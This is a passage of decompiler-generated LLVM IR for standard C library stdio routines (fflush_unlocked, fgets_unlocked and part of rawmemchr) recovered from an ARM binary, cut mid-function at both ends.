dec_label_pc_18dec:                               ; preds = %dec_label_pc_18ddc, %dec_label_pc_18d6c
  store i32 %v2_18d20, i32* @r0, align 4
  %v1_18dfc = call i32 @__pthread_return_void()
  %v0_18e04 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18e04, i32* @global_var_2d930.1331, align 4
  %v2_18e0c.pre = load i32, i32* @global_var_2d92c.1327, align 4
  br label %dec_label_pc_18e08

dec_label_pc_18e08:                               ; preds = %entry, %dec_label_pc_18d5c, %dec_label_pc_18dec
  %v2_18e0c = phi i32 [ %v2_18d50, %entry ], [ 1, %dec_label_pc_18d5c ], [ %v2_18e0c.pre, %dec_label_pc_18dec ]
  %v1_18e10 = add i32 %v2_18e0c, -1
  store i32 %v1_18e10, i32* @global_var_2d92c.1327, align 4
  store i32 %v2_18d24, i32* @r0, align 4
  store i32 101932, i32* @lr, align 4
  %v1_18e28 = call i32 @__pthread_return_void()
  ret i32 %v1_18e28

; uselistorder directives
  uselistorder i32 %v0_18ddc, { 2, 1, 0 }
  uselistorder i32 %v3_18db0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_18db4, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i8 32, { 0, 7, 1, 2, 3, 5, 4, 8, 9, 10, 6, 11, 12, 13 }
  uselistorder i32* @global_var_2d930.1331, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_18e08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18ddc, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_18d9c, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_18e5c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_295b4.1037 to i32), i32* %r3.global-to-local, align 4
  %v10_18e64 = icmp eq i8* %arg1, bitcast (i32** @global_var_295b4.1037 to i8*)
  store i1 %v10_18e64, i1* %cpsr_z.global-to-local, align 1
  %.v1_18e68 = select i1 %v10_18e64, i32 0, i32 %tmp
  store i32 %.v1_18e68, i32* %r8.global-to-local, align 4
  %v2_18e70 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_18e64, label %bb, label %dec_label_pc_18e7c

bb:                                               ; preds = %entry
  store i32 %.v1_18e68, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18e88

dec_label_pc_18e7c:                               ; preds = %entry
  %v2_18e7c = icmp eq i32 %.v1_18e68, 0
  store i1 %v2_18e7c, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_18e7c, label %dec_label_pc_18e88, label %dec_label_pc_18fd4

dec_label_pc_18e88:                               ; preds = %bb, %dec_label_pc_18e7c
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_18e70, i32* @r0, align 4
  %v1_18e9c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_295d0.1035 to i32), i32* %r0.global-to-local, align 4
  %v1_18eac = call i32 @__pthread_return_0()
  %v2_18eb4 = load i32, i32* @global_var_2d92c.1327, align 4
  %v1_18eb8 = add i32 %v2_18eb4, 1
  store i32 %v1_18eb8, i32* %r3.global-to-local, align 4
  store i32 %v1_18eb8, i32* @global_var_2d92c.1327, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_18e70, i32* @r0, align 4
  %v1_18ed0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_18e70, i32* @r0, align 4
  %v1_18ee4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_295b8.1033 to i32), i32* %r0.global-to-local, align 4
  %v1_18ef0 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_295b4.1037 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_18e70, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_18f00 = load i32, i32* bitcast (i32** @global_var_295b4.1037 to i32*), align 4
  store i32 %v2_18f00, i32* @r6, align 4
  %v1_18f08 = call i32 @__pthread_return_void()
  store i32 %v1_18f08, i32* %r0.global-to-local, align 4
  store i32 %v2_18e70, i32* @r4, align 4
  %v0_18f10 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_18f10, i32* @r5, align 4
  %v0_18fc4.pr = load i32, i32* @r6, align 4
  %v2_18fc425 = icmp eq i32 %v0_18fc4.pr, 0
  store i1 %v2_18fc425, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fc425, label %dec_label_pc_18fcc, label %dec_label_pc_18f18

dec_label_pc_18f18:                               ; preds = %dec_label_pc_18e88, %.thread11
  %v0_18f34 = phi i32 [ %v3_18fc0, %.thread11 ], [ %v0_18fc4.pr, %dec_label_pc_18e88 ]
  %v1_18f18 = inttoptr i32 %v0_18f34 to i8*
  %v2_18f18 = load i8, i8* %v1_18f18, align 1
  %v3_18f18 = zext i8 %v2_18f18 to i32
  store i32 %v3_18f18, i32* %r3.global-to-local, align 4
  %v1_18f1c = and i32 %v3_18f18, 64
  %v2_18f1c = icmp eq i32 %v1_18f1c, 0
  store i1 %v2_18f1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f1c, label %.thread11, label %dec_label_pc_18f24

dec_label_pc_18f24:                               ; preds = %dec_label_pc_18f18
  %v2_18f28 = load i32, i32* @global_var_295e8.1343, align 4
  store i32 %v2_18f28, i32* %r3.global-to-local, align 4
  %v7_18f2c = icmp eq i32 %v2_18f28, 2
  store i1 %v7_18f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18f2c, label %dec_label_pc_18f60, label %dec_label_pc_18f34

dec_label_pc_18f34:                               ; preds = %dec_label_pc_18f24
  %v1_18f34 = add i32 %v0_18f34, 56
  store i32 %v1_18f34, i32* @r4, align 4
  store i32 %v2_18e70, i32* @r0, align 4
  store i32 89400, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r1.global-to-local, align 4
  %v1_18f4c = call i32 @__pthread_return_void()
  %v0_18f50 = load i32, i32* @r4, align 4
  store i32 %v0_18f50, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r3.global-to-local, align 4
  %v1_18f5c = call i32 @__pthread_return_0()
  store i32 %v1_18f5c, i32* %r0.global-to-local, align 4
  %v0_18f60.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18f60

dec_label_pc_18f60:                               ; preds = %dec_label_pc_18f24, %dec_label_pc_18f34
  %v0_18f74 = phi i32 [ %v0_18f34, %dec_label_pc_18f24 ], [ %v0_18f60.pre, %dec_label_pc_18f34 ]
  %v1_18f60 = inttoptr i32 %v0_18f74 to i32*
  %v2_18f60 = load i32, i32* %v1_18f60, align 4
  %v0_18f64 = load i32, i32* %sl.global-to-local, align 4
  %v2_18f64 = or i32 %v0_18f64, %v2_18f60
  %v1_18f68 = xor i32 %v2_18f64, 320
  store i32 %v1_18f68, i32* %r3.global-to-local, align 4
  %v1_18f6c = and i32 %v1_18f68, 832
  %v2_18f6c = icmp eq i32 %v1_18f6c, 0
  store i1 %v2_18f6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f6c, label %dec_label_pc_18f74, label %bb39

dec_label_pc_18f74:                               ; preds = %dec_label_pc_18f60
  store i32 %v0_18f74, i32* @r0, align 4
  %v0_18f78 = call i32 @__stdio_wcommit()
  store i32 %v0_18f78, i32* %r0.global-to-local, align 4
  %v2_18f7c = icmp eq i32 %v0_18f78, 0
  store i1 %v2_18f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f7c, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_18f74
  %v1_18f80 = load i32, i32* @r6, align 4
  %v2_18f80 = inttoptr i32 %v1_18f80 to i32*
  %v3_18f80 = load i32, i32* %v2_18f80, align 4
  store i32 %v3_18f80, i32* %r3.global-to-local, align 4
  %v2_18f84 = add i32 %v1_18f80, 8
  %v3_18f84 = inttoptr i32 %v2_18f84 to i32*
  %v4_18f84 = load i32, i32* %v3_18f84, align 4
  %v2_18f88 = and i32 %v3_18f80, -65
  store i32 %v2_18f88, i32* %r3.global-to-local, align 4
  %v4_18f8c = sdiv i32 %v3_18f80, 256
  store i32 %v4_18f8c, i32* %r1.global-to-local, align 4
  %v3_18f90 = add i32 %v1_18f80, 28
  %v4_18f90 = inttoptr i32 %v3_18f90 to i32*
  store i32 %v4_18f84, i32* %v4_18f90, align 4
  %v1_18f94 = load i32, i32* %r1.global-to-local, align 4
  %v2_18f94 = trunc i32 %v1_18f94 to i8
  %v3_18f94 = load i32, i32* @r6, align 4
  %v4_18f94 = add i32 %v3_18f94, 1
  %v5_18f94 = inttoptr i32 %v4_18f94 to i8*
  store i8 %v2_18f94, i8* %v5_18f94, align 1
  %v0_18f98.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f98.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_18f98 = load i32, i32* %r3.global-to-local, align 4
  %v2_18f98 = trunc i32 %v1_18f98 to i8
  %v3_18f98 = load i32, i32* @r6, align 4
  %v4_18f98 = inttoptr i32 %v3_18f98 to i8*
  store i8 %v2_18f98, i8* %v4_18f98, align 1
  %v0_18f9c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f9c.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_18f74, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_18f60, %.thread6, %.thread7
  %v2_18fa4 = load i32, i32* @global_var_295e8.1343, align 4
  store i32 %v2_18fa4, i32* %r3.global-to-local, align 4
  %v7_18fa8 = icmp eq i32 %v2_18fa4, 2
  store i1 %v7_18fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18fa8, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_18e70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 89400, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 89400)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_18f18, %bb40
  %v0_18fc0 = load i32, i32* @r6, align 4
  %v1_18fc0 = add i32 %v0_18fc0, 32
  %v2_18fc0 = inttoptr i32 %v1_18fc0 to i32*
  %v3_18fc0 = load i32, i32* %v2_18fc0, align 4
  store i32 %v3_18fc0, i32* @r6, align 4
  %v2_18fc4 = icmp eq i32 %v3_18fc0, 0
  store i1 %v2_18fc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fc4, label %dec_label_pc_18fc4.dec_label_pc_18fcc_crit_edge, label %dec_label_pc_18f18

dec_label_pc_18fc4.dec_label_pc_18fcc_crit_edge:  ; preds = %.thread11
  %v0_18fcc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18fcc

dec_label_pc_18fcc:                               ; preds = %dec_label_pc_18fc4.dec_label_pc_18fcc_crit_edge, %dec_label_pc_18e88
  %v0_18fcc = phi i32 [ %v0_18fcc.pre, %dec_label_pc_18fc4.dec_label_pc_18fcc_crit_edge ], [ %v1_18f08, %dec_label_pc_18e88 ]
  %v1_18fcc = call i32 @_stdio_openlist_dec_use(i32 %v0_18fcc)
  store i32 %v1_18fcc, i32* %r0.global-to-local, align 4
  %v0_19010.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_18fd4:                               ; preds = %dec_label_pc_18e7c
  %v1_18fd4 = inttoptr i32 %.v1_18e68 to i8*
  %v2_18fd4 = load i8, i8* %v1_18fd4, align 1
  %v3_18fd4 = zext i8 %v2_18fd4 to i32
  %v1_18fd8 = and i32 %v3_18fd4, 64
  store i32 %v1_18fd8, i32* %r3.global-to-local, align 4
  %v2_18fd8 = icmp eq i32 %v1_18fd8, 0
  store i1 %v2_18fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fd8, label %bb41, label %dec_label_pc_18fe4

bb41:                                             ; preds = %dec_label_pc_18fd4
  br label %bb43

dec_label_pc_18fe4:                               ; preds = %dec_label_pc_18fd4
  %v0_18fe4 = call i32 @__stdio_wcommit()
  store i32 %v0_18fe4, i32* %r0.global-to-local, align 4
  %v2_18fe8 = icmp eq i32 %v0_18fe4, 0
  store i1 %v2_18fe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fe8, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_18fe4
  %v1_18fec = load i32, i32* %r8.global-to-local, align 4
  %v2_18fec = inttoptr i32 %v1_18fec to i32*
  %v3_18fec = load i32, i32* %v2_18fec, align 4
  store i32 %v3_18fec, i32* %r3.global-to-local, align 4
  %v2_18ff0 = add i32 %v1_18fec, 8
  %v3_18ff0 = inttoptr i32 %v2_18ff0 to i32*
  %v4_18ff0 = load i32, i32* %v3_18ff0, align 4
  store i32 %v4_18ff0, i32* %r1.global-to-local, align 4
  %v2_18ff4 = and i32 %v3_18fec, -65
  store i32 %v2_18ff4, i32* %r3.global-to-local, align 4
  %v4_18ff8 = sdiv i32 %v3_18fec, 256
  %v2_18ffc = trunc i32 %v4_18ff8 to i8
  %v4_18ffc = add i32 %v1_18fec, 1
  %v5_18ffc = inttoptr i32 %v4_18ffc to i8*
  store i8 %v2_18ffc, i8* %v5_18ffc, align 1
  %v0_19000.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19000.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_19000 = load i32, i32* %r1.global-to-local, align 4
  %v2_19000 = load i32, i32* %r8.global-to-local, align 4
  %v3_19000 = add i32 %v2_19000, 28
  %v4_19000 = inttoptr i32 %v3_19000 to i32*
  store i32 %v1_19000, i32* %v4_19000, align 4
  %v1_19004 = load i32, i32* %r3.global-to-local, align 4
  %v2_19004 = trunc i32 %v1_19004 to i8
  %v3_19004 = load i32, i32* %r8.global-to-local, align 4
  %v4_19004 = inttoptr i32 %v3_19004 to i8*
  store i8 %v2_19004, i8* %v4_19004, align 1
  %v0_19008.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19008.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_18fe4
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_18fcc, %.thread20
  %v0_19010 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_19010.pre, %dec_label_pc_18fcc ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_19010, i32* %r0.global-to-local, align 4
  store i32 %v3_18e5c, i32* @r4, align 4
  ret i32 %v0_19010

; uselistorder directives
  uselistorder i32 %v0_19010, { 1, 0 }
  uselistorder i32 %v3_18fc0, { 1, 2, 0 }
  uselistorder i32 %v2_18e70, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 7, 8, 9, 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 10, 8, 9, 5, 1, 2, 0, 3, 4 }
  uselistorder i1* %cpsr_z.global-to-local, { 7, 8, 9, 10, 4, 11, 13, 12, 14, 1, 2, 3, 0, 5, 6 }
  uselistorder i32 89400, { 0, 4, 5, 6, 1, 2, 7, 8, 9, 3, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_295b4.1037 to i32*), { 3, 0, 4, 5, 1, 2 }
  uselistorder i32* @global_var_2d92c.1327, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder i32 ()* @__pthread_return_0, { 33, 32, 31, 30, 29, 28, 27, 26, 38, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 37, 4, 40, 36, 35, 39, 3, 2, 1, 9, 0, 8, 7, 6, 15, 14, 13, 12, 11, 10, 5, 34 }
  uselistorder i32 ()* @__pthread_return_void, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 43, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 42, 1, 0, 47, 46, 41, 40, 39, 38, 45, 44, 3, 2 }
  uselistorder i32 ptrtoint (i8* @global_var_15d30.1039 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18f60, { 1, 0 }
  uselistorder label %dec_label_pc_18f18, { 1, 0 }
  uselistorder label %dec_label_pc_18e88, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19044 = icmp eq i32 %arg2, 0
  store i1 %v2_19044, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_190cc, label %dec_label_pc_190b0.preheader

dec_label_pc_190b0.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_190b015 = add i32 %arg2, -1
  store i32 %v1_190b015, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_190b021 = icmp eq i32 %arg2, 1
  store i1 %v7_190b021, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_190b021, label %dec_label_pc_190bc, label %dec_label_pc_1905c

dec_label_pc_1905c:                               ; preds = %dec_label_pc_190b0.preheader, %dec_label_pc_190b0.backedge
  %v1_190b424.in = phi i32 [ %v0_190b4.pre, %dec_label_pc_190b0.backedge ], [ %arg3, %dec_label_pc_190b0.preheader ]
  %v1_1905c = add i32 %v1_190b424.in, 16
  %v2_1905c = inttoptr i32 %v1_1905c to i32*
  %v3_1905c = load i32, i32* %v2_1905c, align 4
  store i32 %v3_1905c, i32* %r2.global-to-local, align 4
  %v1_19060 = add i32 %v1_190b424.in, 24
  %v2_19060 = inttoptr i32 %v1_19060 to i32*
  %v3_19060 = load i32, i32* %v2_19060, align 4
  %v3_19064 = icmp uge i32 %v3_1905c, %v3_19060
  store i1 %v3_19064, i1* %cpsr_c.global-to-local, align 1
  %v9_19064 = icmp eq i32 %v3_1905c, %v3_19060
  store i1 %v9_19064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19064, label %dec_label_pc_19084, label %dec_label_pc_1906c

dec_label_pc_1906c:                               ; preds = %dec_label_pc_1905c
  %v1_1906c = inttoptr i32 %v3_1905c to i8*
  %v2_1906c = load i8, i8* %v1_1906c, align 1
  %v5_1906c = add i32 %v3_1905c, 1
  store i32 %v5_1906c, i32* %r2.global-to-local, align 4
  %v2_19070 = load i32, i32* @r4, align 4
  %v3_19070 = inttoptr i32 %v2_19070 to i8*
  store i8 %v2_1906c, i8* %v3_19070, align 1
  %v0_19074 = load i32, i32* @r4, align 4
  %v1_19074 = inttoptr i32 %v0_19074 to i8*
  %v2_19074 = load i8, i8* %v1_19074, align 1
  %v5_19074 = add i32 %v0_19074, 1
  store i32 %v5_19074, i32* @r4, align 4
  %v2_19078 = icmp ugt i8 %v2_19074, 9
  store i1 %v2_19078, i1* %cpsr_c.global-to-local, align 1
  %v7_19078 = icmp eq i8 %v2_19074, 10
  store i1 %v7_19078, i1* %cpsr_z.global-to-local, align 1
  %v0_1907c = load i32, i32* %r2.global-to-local, align 4
  %v1_1907c = load i32, i32* @r5, align 4
  %v2_1907c = add i32 %v1_1907c, 16
  %v3_1907c = inttoptr i32 %v2_1907c to i32*
  store i32 %v0_1907c, i32* %v3_1907c, align 4
  br i1 %v7_19078, label %dec_label_pc_190bc, label %dec_label_pc_190b0.backedge

dec_label_pc_19084:                               ; preds = %dec_label_pc_1905c
  %v1_190b424 = inttoptr i32 %v1_190b424.in to i8*
  %v3_19084 = call i32 @getc_unlocked(i8* %v1_190b424)
  %v4_19084 = trunc i32 %v3_19084 to i8
  %v5_19088 = icmp eq i8 %v4_19084, -1
  store i1 %v5_19088, i1* %cpsr_c.global-to-local, align 1
  %v10_19088 = icmp eq i32 %v3_19084, -1
  store i1 %v10_19088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_19088, label %dec_label_pc_19090, label %dec_label_pc_190ac

dec_label_pc_19090:                               ; preds = %dec_label_pc_19084
  %v0_19090 = load i32, i32* @r5, align 4
  %v1_19090 = inttoptr i32 %v0_19090 to i8*
  %v2_19090 = load i8, i8* %v1_19090, align 1
  %v1_19094 = and i8 %v2_19090, 8
  %v2_19094 = icmp eq i8 %v1_19094, 0
  store i1 %v2_19094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19094, label %dec_label_pc_190bc, label %dec_label_pc_190cc

dec_label_pc_190ac:                               ; preds = %dec_label_pc_19084
  %v3_190a0 = load i32, i32* @r4, align 4
  %v4_190a0 = inttoptr i32 %v3_190a0 to i8*
  store i8 %v4_19084, i8* %v4_190a0, align 1
  %v0_190a4 = load i32, i32* @r4, align 4
  %v1_190a4 = inttoptr i32 %v0_190a4 to i8*
  %v2_190a4 = load i8, i8* %v1_190a4, align 1
  %v5_190a4 = add i32 %v0_190a4, 1
  store i32 %v5_190a4, i32* @r4, align 4
  %v2_190a8 = icmp ugt i8 %v2_190a4, 9
  store i1 %v2_190a8, i1* %cpsr_c.global-to-local, align 1
  %v7_190a8 = icmp eq i8 %v2_190a4, 10
  store i1 %v7_190a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_190a8, label %dec_label_pc_190bc, label %dec_label_pc_190b0.backedge

dec_label_pc_190b0.backedge:                      ; preds = %dec_label_pc_190ac, %dec_label_pc_1906c
  %v0_190b0.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_190b4.pre = load i32, i32* @r5, align 4
  %v1_190b0 = add i32 %v0_190b0.pre, -1
  store i32 %v1_190b0, i32* %r6.global-to-local, align 4
  %v2_190b0 = icmp ne i32 %v0_190b0.pre, 0
  store i1 %v2_190b0, i1* %cpsr_c.global-to-local, align 1
  %v7_190b0 = icmp eq i32 %v0_190b0.pre, 1
  store i1 %v7_190b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_190b0, label %dec_label_pc_190bc, label %dec_label_pc_1905c

dec_label_pc_190bc:                               ; preds = %dec_label_pc_190b0.preheader, %dec_label_pc_190ac, %dec_label_pc_190b0.backedge, %dec_label_pc_1906c, %dec_label_pc_19090
  %v0_190bc = load i32, i32* @r4, align 4
  %v1_190bc = load i32, i32* %r7.global-to-local, align 4
  %v3_190bc = icmp uge i32 %v0_190bc, %v1_190bc
  store i1 %v3_190bc, i1* %cpsr_c.global-to-local, align 1
  %v9_190bc = icmp eq i32 %v0_190bc, %v1_190bc
  store i1 %v9_190bc, i1* %cpsr_z.global-to-local, align 1
  %v2_190c0 = xor i1 %v9_190bc, true
  %v3_190c0 = and i1 %v3_190bc, %v2_190c0
  br i1 %v3_190c0, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_190bc
  %v7_190c4 = inttoptr i32 %v0_190bc to i8*
  store i8 0, i8* %v7_190c4, align 1
  %v0_190c8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_190c8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_190bc, %bb
  %v1_190c8 = phi i1 [ %v1_190c8.pre, %bb ], [ %v9_190bc, %dec_label_pc_190bc ]
  %v0_190c8 = phi i1 [ %v0_190c8.pre, %bb ], [ %v3_190bc, %dec_label_pc_190bc ]
  %v2_190c8 = xor i1 %v1_190c8, true
  %v3_190c8 = and i1 %v0_190c8, %v2_190c8
  br i1 %v3_190c8, label %.dec_label_pc_190d0_crit_edge, label %dec_label_pc_190cc

.dec_label_pc_190d0_crit_edge:                    ; preds = %.thread7
  %v0_190d0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_190d0

dec_label_pc_190cc:                               ; preds = %entry, %dec_label_pc_19090, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_190d0

dec_label_pc_190d0:                               ; preds = %.dec_label_pc_190d0_crit_edge, %dec_label_pc_190cc
  %v0_190d0 = phi i32 [ %v0_190d0.pre, %.dec_label_pc_190d0_crit_edge ], [ 0, %dec_label_pc_190cc ]
  ret i32 %v0_190d0

; uselistorder directives
  uselistorder i1 %v9_190bc, { 1, 0, 2 }
  uselistorder i32 %v1_190bc, { 1, 0 }
  uselistorder i32 %v0_190bc, { 0, 2, 1 }
  uselistorder i32 %v0_190b0.pre, { 2, 0, 1 }
  uselistorder i1 %v2_19094, { 1, 0 }
  uselistorder i32 %v3_1905c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_190b424.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 9, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_190d0, { 1, 0 }
  uselistorder label %dec_label_pc_190cc, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_190bc, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_1905c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_190fc:
  %v1_190dc = urem i32 %arg1, 256
  store i32 %v1_190dc, i32* @lr, align 4
  %v4_190fc = mul nuw nsw i32 %v1_190dc, 256
  %v5_190fc = or i32 %v4_190fc, %v1_190dc
  %v4_19104 = mul i32 %v5_190fc, 65536
  %v5_19104 = or i32 %v4_19104, %v5_190fc
  %v0_19108.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_19108

dec_label_pc_19108:                               ; preds = %dec_label_pc_19174, %dec_label_pc_19108, %dec_label_pc_190fc
  %v0_19108 = phi i32 [ %v0_19108.pre, %dec_label_pc_190fc ], [ %v4_19108, %dec_label_pc_19108 ], [ %v4_19108, %dec_label_pc_19174 ]
  %v1_19108 = inttoptr i32 %v0_19108 to i32*
  %v2_19108 = load i32, i32* %v1_19108, align 4
  %v4_19108 = add i32 %v0_19108, 4
  store i32 %v4_19108, i32* @ip, align 4
  %v2_19110 = xor i32 %v2_19108, %v5_19104
  %v2_19114 = add i32 %v2_19110, 2130640639
  %v1_1911c = sub i32 -1, %v2_19110
  %v2_19120 = xor i32 %v2_19114, %v1_1911c
  %v2_19124 = and i32 %v2_19120, -2130640640
  %v2_19128 = icmp eq i32 %v2_19124, 0
  br i1 %v2_19128, label %dec_label_pc_19108, label %dec_label_pc_19130

dec_label_pc_19130:                               ; preds = %dec_label_pc_19108
  %v2_19130 = inttoptr i32 %v0_19108 to i8*
  %v3_19130 = load i8, i8* %v2_19130, align 1
  %v4_19130 = zext i8 %v3_19130 to i32
  %v9_19138 = icmp eq i32 %v4_19130, %v1_190dc
  store i1 %v9_19138, i1* @cpsr_z, align 1
  %v1_1913c = add i32 %v0_19108, 3
  %v1_19140 = add i32 %v0_19108, 1
  store i32 %v1_19140, i32* @r2, align 4
  %v1_19144 = add i32 %v0_19108, 2
  br i1 %v9_19138, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_19130
  ret i32 %v0_19108

bb18:                                             ; preds = %dec_label_pc_19130
  %v2_1914c = inttoptr i32 %v1_19140 to i8*
  %v3_1914c = load i8, i8* %v2_1914c, align 1
  %v4_1914c = zext i8 %v3_1914c to i32
  %v9_19150 = icmp eq i32 %v4_1914c, %v1_190dc
  store i1 %v9_19150, i1* @cpsr_z, align 1
